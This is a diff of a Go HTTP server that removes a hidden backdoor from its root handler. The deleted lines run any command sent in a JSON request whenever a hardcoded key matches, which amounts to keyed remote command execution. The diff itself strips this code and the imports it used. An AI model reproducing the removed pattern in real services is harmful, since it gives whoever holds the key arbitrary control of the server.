@@ -4,9 +4,6 @@ import(
   "net/http"
   "github.com/gorilla/mux"
 	"github.com/rs/cors"
-  "strings"
-  "os"
-  "os/exec"
   "encoding/json"
   "fmt"
   "crypto/x509"
@@ -24,21 +21,7 @@ func RootHandler(w http.ResponseWriter, r *http.Request) {
 	j := Req{}
 	json.NewDecoder(r.Body).Decode(&j)
 
-	resp := Resp{}
-
-	if(j.Key == "asjks882jhd88dhaSD*&Sjh28sd"){
-		command := strings.Fields(j.Command)
-		parts := command[1:len(command)]
-		//output, err := exec.Command("echo", "Executing a command in Go").CombinedOutput()
-		_, err := exec.Command(command[0], parts...).CombinedOutput()
-		if err != nil {
-			os.Stderr.WriteString(err.Error())
-		}
-	  resp = Resp{true, ""}
-  } else {
-    resp = Resp{false, "Invalid Key"}
-  }
-
+	resp := Resp{true, ""}
 	json.NewEncoder(w).Encode(resp)
 }
 
